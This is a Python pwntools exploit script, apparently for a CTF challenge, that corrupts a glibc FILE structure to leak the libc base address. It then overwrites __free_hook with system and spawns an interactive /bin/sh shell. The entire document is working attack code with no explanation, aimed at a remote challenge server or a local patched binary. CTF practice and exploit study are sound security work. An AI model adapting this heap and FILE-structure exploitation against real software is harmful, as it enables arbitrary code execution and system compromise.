from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = "debug"

libc = ELF("./libc.so.6")

is_remote = False
if is_remote:
    io = remote("edu-ctf.zoolab.org", 30218)
else:
    # io = gdb.debug("./chal_patched", "c")
    io = process("./chal_patched", "c", stdout=PIPE)

# new file
io.sendlineafter(b"> ", b"1")

# overwrite fileno
io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    b"a" * 0x200
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000 | 0x0800,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
        ]
    ),
)

# restore pointers
io.sendlineafter(b"> ", b"3")

# partial overwrite
io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    cyclic(0x200)
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000 | 0x0800 | 0x1000 | 0x0002,
            0,
            0,
            0,
            # gets will insert a null byte, partial overwrite write_base
        ]
    ),
)

# leak libc


# idk why, but remote need this hack...
if is_remote:
    for _ in range(8):
        io.sendlineafter(b"> ", b"3")
else:
    io.sendlineafter(b"> ", b"3")


io.recvuntil(b"\x00" * 0x80)
libc_base = int.from_bytes(io.recv(6), "little") - 0x1ECF60
print(f"{libc_base = :#x}")
libc.address = libc_base

gadget = libc.sym["system"]
target = libc.sym["__free_hook"]
payload = flat([gadget] * 16)
payload += b"a" * (0x200 - len(payload))

io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    payload
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000 | 0x0800,
            0,
            0,
            0,
            0,
            target,
            target + 0x400,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
        ]
    ),
)


io.sendlineafter(b"> ", b"3")

binsh = next(libc.search(b"/bin/sh\0"))
print(f"{binsh = :#x}")

io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    b"a" * 0x200
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000 | 0x0100,
            0,
            0,
            binsh,  # read_base, will be swapped with save_base
            1,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
        ]
    ),
)
io.sendlineafter(b"> ", b"3")


io.interactive()
